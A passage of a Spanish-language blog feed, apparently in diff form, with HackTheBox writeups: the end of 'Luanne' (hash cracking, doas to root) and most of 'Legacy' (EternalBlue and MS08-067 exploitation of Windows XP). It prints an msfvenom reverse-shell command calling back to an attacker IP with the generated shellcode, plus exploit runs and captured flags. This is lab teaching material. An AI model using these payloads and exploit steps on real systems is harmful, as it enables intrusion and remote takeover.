+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;backups     devel       public_html user.txt
+luanne$ cat user.txt                                                                                                                                                                  
+ea5f0ce6a917b0be1eabc7f9218febc0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Si listamos el directorio del usuario, obsevamos un directorio &lt;code&gt;backup&lt;/code&gt;, que dentro contiene un archivo tar encrpytado.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ ls
+backups     devel       public_html user.txt
+luanne$ cd backups/                                                                                                                                                                   
+luanne$ ls 
+devel_backup-2020-09-16.tar.gz.enc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora en &lt;code&gt;NETBSD&lt;/code&gt;, existe una herramienta para decsencriptar estos archivos que corresponde ah &lt;code&gt;netpgp&lt;/code&gt;. Si ejecutamos la herramienta nos muestra el panel de ayuda para poder ejecutarla correctamente.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ netpgp
+NetPGP portable 3.99.17/[20101103]
+All bug reports, praise and chocolate, please, to:
+Alistair Crooks &amp;lt;agc@netbsd.org&amp;gt; c0596823
+Usage: netpgp COMMAND OPTIONS:
+netpgp  --help OR
+        --encrypt [--output=file] [options] files... OR
+        --decrypt [--output=file] [options] files... OR
+
+        --sign [--armor] [--detach] [--hash=alg] [--output=file]
+                [options] files... OR
+        --verify [options] files... OR
+        --cat [--output=file] [options] files... OR
+        --clearsign [--output=file] [options] files... OR
+        --list-packets [options] OR
+        --version
+where options are:
+        [--cipher=&amp;lt;ciphername&amp;gt;] AND/OR
+        [--coredumps] AND/OR
+        [--homedir=&amp;lt;homedir&amp;gt;] AND/OR
+        [--keyring=&amp;lt;keyring&amp;gt;] AND/OR
+        [--numtries=&amp;lt;attempts&amp;gt;] AND/OR
+        [--userid=&amp;lt;userid&amp;gt;] AND/OR
+        [--maxmemalloc=&amp;lt;number of bytes&amp;gt;] AND/OR
+        [--verbose]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Despues de decsencriptar el archivo, vamos a traernoslo a nuestro equipo para descromprimirlo, como no cuenta con &lt;code&gt;python&lt;/code&gt;, usaremos &lt;code&gt;nc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Luanne/lua13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo descomprimimos y dentro vemos otro archivo &lt;code&gt;.htpasswd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
+ devel_backup-2020-09-16.tar.gz   id_rsa
+❯ file devel_backup-2020-09-16.tar.gz
+devel_backup-2020-09-16.tar.gz: gzip compressed data, last modified: Tue Nov 24 09:18:51 2020, from Unix, original size modulo 2^32 12288
+❯ tar -xf devel_backup-2020-09-16.tar.gz
+❯ ls
+ devel-2020-09-16   devel_backup-2020-09-16.tar.gz   id_rsa
+❯ cd devel-2020-09-16
+❯ ls
+ webapi   www
+❯ tree -fas
+.
+├── [         22]  ./webapi
+│   └── [       7072]  ./webapi/weather.lua
+└── [         38]  ./www
+    ├── [         47]  ./www/.htpasswd
+    └── [        378]  ./www/index.html
+
+2 directories, 3 files
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Al leer el archivo, vemos una contraeña &lt;code&gt;hasheada&lt;/code&gt;, pero que es distinta a la obtuvimos previamente. Asi con john vamos a intentar crackear este otro &lt;code&gt;hash&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash2
+Warning: detected hash type &quot;md5crypt&quot;, but the string is also recognized as &quot;md5crypt-long&quot;
+Use the &quot;--format=md5crypt-long&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+littlebear       (webapi_user)
+1g 0:00:00:00 DONE (2023-06-29 18:21) 7.142g/s 93257p/s 93257c/s 93257C/s gamboa..hello11
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Obtenemos una nueva contraseña &lt;code&gt;littlebear&lt;/code&gt;, que curiosamente corresponde a la del usuario &lt;code&gt;root&lt;/code&gt;, pero para migrar no podemos hacer uso de &lt;code&gt;su root&lt;/code&gt;, ya que en &lt;code&gt;NETBSD&lt;/code&gt; lo hacemos usando el comando &lt;code&gt;doas&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;luanne$ su root 
+su: You are not listed in the correct secondary group (wheel) to su root.
+su: Sorry: Authentication error
+luanne$ doas sh
+Password:
+# whoami
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Finalmente solo debemos dirigirnos al directorio personal del usuario root y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; y asi habriamos concluido.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# cd /root
+# cat root.txt
+7a9b5c206e8e8ba09bb99bd113675f66
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Thu, 29 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Luanne</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Luanne</guid>
+        
+        <category>NETBSD</category>
+        
+        <category>Api json explotation</category>
+        
+        <category>Lua Command Injection</category>
+        
+        <category>Abussing httpd Parameter</category>
+        
+        <category>Cracking Hashes</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
+    
+      <item>
+        <title>Maquina Legacy - htb writeup</title>
+        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Legacy&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de &lt;code&gt;eternal blue&lt;/code&gt; usando el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por &lt;code&gt;smb&lt;/code&gt; donde se nos reprotara que el servicio es vulnerable a el exploit &lt;code&gt;MS08_067&lt;/code&gt; el cual tambien explotaremos a traves de la creación de un &lt;code&gt;shellcode&lt;/code&gt; para asi obtener acceso como el usuario &lt;code&gt;adminsitrator&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Comenzaremos como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Legacy
+❯ ls
+ Legacy
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.4
+PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
+64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=119 ms
+
+--- 10.10.10.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 118.571/118.571/118.571/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:54 GMT
+Initiating SYN Stealth Scan at 18:54
+Scanning 10.10.10.4 [65535 ports]
+Discovered open port 139/tcp on 10.10.10.4
+Discovered open port 445/tcp on 10.10.10.4
+Discovered open port 135/tcp on 10.10.10.4
+Completed SYN Stealth Scan at 18:55, 21.64s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.4
+Host is up, received user-set (0.18s latency).
+Scanned at 2023-06-29 18:54:52 GMT for 21s
+Not shown: 56233 closed tcp ports (reset), 9299 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT    STATE SERVICE      REASON
+135/tcp open  msrpc        syn-ack ttl 127
+139/tcp open  netbios-ssn  syn-ack ttl 127
+445/tcp open  microsoft-ds syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
+           Raw packets sent: 106649 (4.693MB) | Rcvd: 65813 (2.633MB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445 10.10.10.4 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:56 GMT
+Nmap scan report for 10.10.10.4
+Host is up (0.18s latency).
+
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows XP microsoft-ds
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:a9:4a (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2023-07-04T23:53:50+03:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows XP&lt;/code&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Puerto&lt;/th&gt;
+      &lt;th&gt;Servicio&lt;/th&gt;
+      &lt;th&gt;Versión&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;135&lt;/td&gt;
+      &lt;td&gt;RPC&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;139&lt;/td&gt;
+      &lt;td&gt;LDAP&lt;/td&gt;
+      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;445&lt;/td&gt;
+      &lt;td&gt;SMB&lt;/td&gt;
+      &lt;td&gt;Windows XP microsoft-ds&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Como vemos que la maquina corresponde &lt;code&gt;Windows XP&lt;/code&gt;, podemos explotar el &lt;code&gt;eternal blue&lt;/code&gt;, asi que vamos a explotarlo usando el exploit de github de warawit.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;https://github.com/worawit/MS17-010&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Descargamos al repositorio y ejecutamos el &lt;code&gt;checker.py&lt;/code&gt;, para encontrar &lt;code&gt;named pipes&lt;/code&gt; vulnerables.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Ejectamos el &lt;code&gt;checker.py&lt;/code&gt; el cual nos reporta dos &lt;code&gt;named pipes&lt;/code&gt; de los que podemos abusar.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.4
+Target OS: Windows 5.1
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: Ok (32 bit)
+samr: STATUS_ACCESS_DENIED
+netlogon: STATUS_ACCESS_DENIED
+lsarpc: STATUS_ACCESS_DENIED
+browser: Ok (32 bit)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora nos abriremos el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, para modificar la instrucción que queremos ejecutar al lanzar el exploit, en la que nos montaremos un recurso compartido en nuestra maquina donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt; el cual se ejecutara otorgandonos una conexión a nuestra maquina. Esto descomentado la opción &lt;code&gt;service_exec&lt;/code&gt; y comentaremos las lineas previas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para ello, podemos descarganos el ejecutable de &lt;code&gt;nc&lt;/code&gt;, para ello iremos al siguiente enlace y descargaremos el correspondiente a la versión &lt;code&gt;1.12&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si optamos por descargarlo de esta manera obtendremos un comprimido, el cual debemos descomprimirlo en una carpeta aparte ya que este contiene muchos archivos.&lt;/p&gt;
+
+&lt;p&gt;En mi caso yo usare el &lt;code&gt;nc.exe&lt;/code&gt; que contempla el repositorio de &lt;code&gt;danil miesler&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cp /opt/SecLists/Miscellaneous/web/http-request-headers/nc.exe .
+❯ ls
+ MS17-010   nc.exe   netcat-win32-1.12.zip
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procedemos a montar nuestro recurso compartido, donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; por el puerto que configuramos, en este caso el correspondiente a el &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ejecutamos el &lt;code&gt;zzz_exploit.py&lt;/code&gt; junto con el named pipe que previamente nos reporto el &lt;code&gt;checker.py&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py 10.10.10.4 spoolss
+Target OS: Windows 5.1
+Groom packets
+attempt controlling next transaction on x86
+success controlling one transaction
+modify parameter count to 0xffffffff to be able to write backward
+leak next transaction
+CONNECTION: 0x86101b30
+SESSION: 0xe1b1cc68
+FLINK: 0x7bd48
+InData: 0x7ae28
+MID: 0xa
+TRANS1: 0x78b50
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;y recibimos la conexión.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.4.
+Ncat: Connection from 10.10.10.4:1046.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ahora podemos ir al directorio del usuario john y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Documents and Settings\john\Desktop&amp;gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings\john\Desktop
+
+16/03/2017  09:19     &amp;lt;DIR&amp;gt;          .
+16/03/2017  09:19     &amp;lt;DIR&amp;gt;          ..
+16/03/2017  09:19                 32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)   6.342.070.272 bytes free
+
+C:\Documents and Settings\john\Desktop&amp;gt;type user.txt
+type user.txt
+e69af0e4f443de7e36876fda4ec7644f
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;explotacion-alterna&quot;&gt;EXPLOTACION ALTERNA &lt;a href=&quot;#explotacion-alterna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Ahora para comprometer la maquina de una manera alternativa, primero usaremos los scripts &lt;code&gt;smb-vuln\*&lt;/code&gt; de nmap en el puerto &lt;code&gt;445&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;QUITTING!
+❯ nmap --script smb-vuln\* -p445 10.10.10.4 -oN smbScan
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 19:55 GMT
+Nmap scan report for 10.10.10.4
+Host is up (0.12s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
+|_smb-vuln-ms10-054: false
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+
+Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nmap nos reporta que el servicio es vulnerable a &lt;code&gt;ms08-067&lt;/code&gt; ya que corresponde a un &lt;code&gt;Windows XP&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Para poder explotarla vamos a descargarnos un exploit de &lt;code&gt;andyacer&lt;/code&gt; de github:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://github.com/andyacer/ms08_067&quot;&gt;https://github.com/andyacer/ms08_067&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Ahi nos explican a fondo en que consiste la explotación y nos pide que generemos un &lt;code&gt;shellcode&lt;/code&gt; el cual debemos ingresar al &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Para ello vamos a generar el shellcode usando &lt;code&gt;msfvenom&lt;/code&gt;, si no sabes como en el repositorio te explica como debemos hacerlo exactamente, solo debemos especificar nuestra ip y el puerto.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
+Attempting to encode payload with 1 iterations of generic/none
+generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
+Attempting to encode payload with 1 iterations of x86/call4_dword_xor
+x86/call4_dword_xor succeeded with size 348 (iteration=0)
+x86/call4_dword_xor chosen with final size 348
+Payload size: 348 bytes
+Final size of c file: 1491 bytes
+unsigned char buf[] = 
+&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76&quot;
+&quot;\x0e\x63\xc8\xc3\x99\x83\xee\xfc\xe2\xf4\x9f\x20\x41\x99&quot;
+&quot;\x63\xc8\xa3\x10\x86\xf9\x03\xfd\xe8\x98\xf3\x12\x31\xc4&quot;
+&quot;\x48\xcb\x77\x43\xb1\xb1\x6c\x7f\x89\xbf\x52\x37\x6f\xa5&quot;
+&quot;\x02\xb4\xc1\xb5\x43\x09\x0c\x94\x62\x0f\x21\x6b\x31\x9f&quot;
+&quot;\x48\xcb\x73\x43\x89\xa5\xe8\x84\xd2\xe1\x80\x80\xc2\x48&quot;
+&quot;\x32\x43\x9a\xb9\x62\x1b\x48\xd0\x7b\x2b\xf9\xd0\xe8\xfc&quot;
+&quot;\x48\x98\xb5\xf9\x3c\x35\xa2\x07\xce\x98\xa4\xf0\x23\xec&quot;
+&quot;\x95\xcb\xbe\x61\x58\xb5\xe7\xec\x87\x90\x48\xc1\x47\xc9&quot;
+&quot;\x10\xff\xe8\xc4\x88\x12\x3b\xd4\xc2\x4a\xe8\xcc\x48\x98&quot;
+&quot;\xb3\x41\x87\xbd\x47\x93\x98\xf8\x3a\x92\x92\x66\x83\x97&quot;
+&quot;\x9c\xc3\xe8\xda\x28\x14\x3e\xa0\xf0\xab\x63\xc8\xab\xee&quot;
+&quot;\x10\xfa\x9c\xcd\x0b\x84\xb4\xbf\x64\x37\x16\x21\xf3\xc9&quot;
+&quot;\xc3\x99\x4a\x0c\x97\xc9\x0b\xe1\x43\xf2\x63\x37\x16\xc9&quot;
+&quot;\x33\x98\x93\xd9\x33\x88\x93\xf1\x89\xc7\x1c\x79\x9c\x1d&quot;
+&quot;\x54\xf3\x66\xa0\xc9\x93\x73\xcb\xab\x9b\x63\xc9\x78\x10&quot;
+&quot;\x85\xa2\xd3\xcf\x34\xa0\x5a\x3c\x17\xa9\x3c\x4c\xe6\x08&quot;
+&quot;\xb7\x95\x9c\x86\xcb\xec\x8f\xa0\x33\x2c\xc1\x9e\x3c\x4c&quot;
+&quot;\x0b\xab\xae\xfd\x63\x41\x20\xce\x34\x9f\xf2\x6f\x09\xda&quot;
+&quot;\x9a\xcf\x81\x35\xa5\x5e\x27\xec\xff\x98\x62\x45\x87\xbd&quot;
+&quot;\x73\x0e\xc3\xdd\x37\x98\x95\xcf\x35\x8e\x95\xd7\x35\x9e&quot;
+&quot;\x90\xcf\x0b\xb1\x0f\xa6\xe5\x37\x16\x10\x83\x86\x95\xdf&quot;
+&quot;\x9c\xf8\xab\x91\xe4\xd5\xa3\x66\xb6\x73\x23\x84\x49\xc2&quot;
+&quot;\xab\x3f\xf6\x75\x5e\x66\xb6\xf4\xc5\xe5\x69\x48\x38\x79&quot;
+&quot;\x16\xcd\x78\xde\x70\xba\xac\xf3\x63\x9b\x3c\x4c&quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ese shellcode generado, ahora vamos a introducirlo en el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ejecutamos el exploit sin antes ponernos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 ms08_067_2018.py 10.10.10.4 6 445
+#######################################################################
+#   MS08-067 Exploit
+#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
+#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
+#
+#   Mod in 2018 by Andy Acer:
+#   - Added support for selecting a target port at the command line.
+#     It seemed that only 445 was previously supported.
+#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
+#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
+#     into this source file.
+#######################################################################
+
+Windows XP SP3 English (NX)
+
+[-]Initiating connection
+[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
+Exploit finish
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Recibimos la conexión, ahora podemos ir al directorio del usuario &lt;code&gt;Administrator&lt;/code&gt; y leer la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
